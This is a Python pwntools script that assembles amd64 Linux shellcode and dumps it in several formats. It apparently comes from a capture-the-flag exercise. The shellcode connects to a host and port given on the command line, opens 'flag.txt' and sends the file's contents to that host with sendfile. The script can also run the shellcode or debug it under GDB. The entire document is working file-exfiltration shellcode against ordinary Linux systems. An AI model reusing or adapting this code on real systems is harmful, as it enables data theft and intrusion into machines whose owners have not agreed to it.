from pwn import *
import ctypes, struct, sys, os, socket

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
context.log_level = 'error'

if (len(sys.argv) < 3):
  print('%s <IP> <PORT> [RUN or GDB]' % (sys.argv[0]))
  exit(1)

# define HOST & PORT here or in command line
IP, PORT = (sys.argv[1], int(sys.argv[2],10)) if len(sys.argv) > 2 else ('127.0.0.1', 12490)

def sockaddr():
    family = struct.pack('H', socket.AF_INET)
    portbytes = struct.pack('H', socket.htons(PORT))
    ipbytes = socket.inet_aton(IP)
    number = struct.unpack('Q', family + portbytes + ipbytes)
    number = -number[0]        #negate
    return hex((number + (1 << 64)) % (1 << 64))

def dumpit(shellc):
  print('shellcode length: {:d} bytes'.format(len(shellc)))
  # dump as hex number array
  print('\n\"\\x{}\"'.format('\\x'.join([format(b, '02x') for b in bytearray(shellc)])))
  # dump as C array
  print("\nunsigned char shellc[] = {{{}}};".format(", ".join([format(b, '#02x') for b in bytearray(shellc)])))
  # dump as hex array
  print('\nproblematic values are highlighted (00,0a,20) check your IP,port...\n')
  print(hexdump(shellc, highlight=b'\x0a\x20\x00'))

shellc = asm ('''
socket:
        sub rsp,120
        push 41
        pop rax
        cdq
        push 2
        pop rdi
        push 1
        pop rsi
	syscall
connect:
        mov ebp,eax
	xchg eax,edi
	mov al,42
        mov rcx,%s
        neg rcx
        push rcx
        push rsp
        pop rsi
        mov dl,16
        syscall

	lea rdi,fname[rip]
	xor esi,esi
	push 2
	pop rax
	syscall

	mov edi,ebp
	mov esi,eax
	xor edx,edx
	push 120
	pop r10
	push 40
	pop rax
	syscall
loopit:	jmp loopit
fname:
	.string "flag.txt"

''' % (sockaddr()))


dumpit(shellc)

if args.EXE:
  ELF.from_bytes(shellc).save('binary')

if args.RUN:
  p = run_shellcode(shellc)
  p.interactive()
elif args.GDB:
  p = debug_shellcode(shellc, gdbscript='''
    # set your pwndbg/gef path here
    source ~/gef.bata24.git/gef.py
    context
  ''')
  p.interactive()
  
